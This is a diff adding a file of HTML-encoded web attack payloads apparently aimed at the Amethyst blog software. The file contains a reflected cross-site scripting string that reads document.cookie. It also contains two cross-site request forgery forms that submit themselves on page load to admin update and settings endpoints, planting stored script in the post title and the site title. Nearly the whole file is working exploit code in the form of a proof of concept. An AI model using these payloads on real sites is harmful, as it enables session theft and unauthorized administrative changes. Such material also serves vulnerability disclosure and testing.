@@ -1,0 +1,47 @@
+&#039;mynameis&lt;script&gt;alert(document.cookie)&lt;/script&gt;
+
+&lt;form action=&quot;http://www.example.com/admin/update/2&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;post[title]&quot; value=&#039;title&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;post[content]&quot; value=&quot;this is my post&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;post[created_at(1i)]&quot; value=&quot;2010&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;post[created_at(2i)]&quot; value=&quot;7&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;post[created_at(3i)]&quot; value=&quot;15&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;post[created_at(4i)]&quot; value=&quot;20&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;post[created_at(5i)]&quot; value=&quot;39&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;post[updated_at(1i)]&quot; value=&quot;2010&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;post[updated_at(2i)]&quot; value=&quot;7&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;post[updated_at(3i)]&quot; value=&quot;15&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;post[updated_at(4i)]&quot; value=&quot;20&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;post[updated_at(5i)]&quot; value=&quot;39&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;commit&quot; value=&quot;Create&quot; /&gt;
+
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
+
+
+&lt;form action=&quot;http://ww.example.com/admin/update_settings&quot; method=&quot;post&quot; name=&quot;main&quot; &gt;
+
+&lt;input type=&quot;hidden&quot; name=&quot;setting[site_title]&quot; value=&#039;My blog&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&#039; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[site_description]&quot; value=&quot;Welcome to My Amethyst Blog!&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[site_keywords]&quot; value=&quot;amethyst blog, xss&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[enable_site_title]&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[posts_per_page]&quot; value=&quot;10&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[archive_months_to_show]&quot; value=&quot;12&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[enable_menu_archive]&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[enable_menu_search]&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[enable_menu_tools]&quot; value=&quot;0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[enable_menu_other]&quot; value=&quot;1&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[item_thumbnail_width]&quot; value=&quot;100&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[item_thumbnail_height]&quot; value=&quot;100&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[resize_item_images]&quot; value=&quot;0&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[item_image_width]&quot; value=&quot;500&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;setting[item_image_height]&quot; value=&quot;500&quot; /&gt;
+&lt;input type=&quot;hidden&quot; name=&quot;commit&quot; value=&quot;Update Settings&quot; /&gt;
+
+&lt;/form&gt;
+&lt;script&gt;
+document.main.submit();
+&lt;/script&gt;
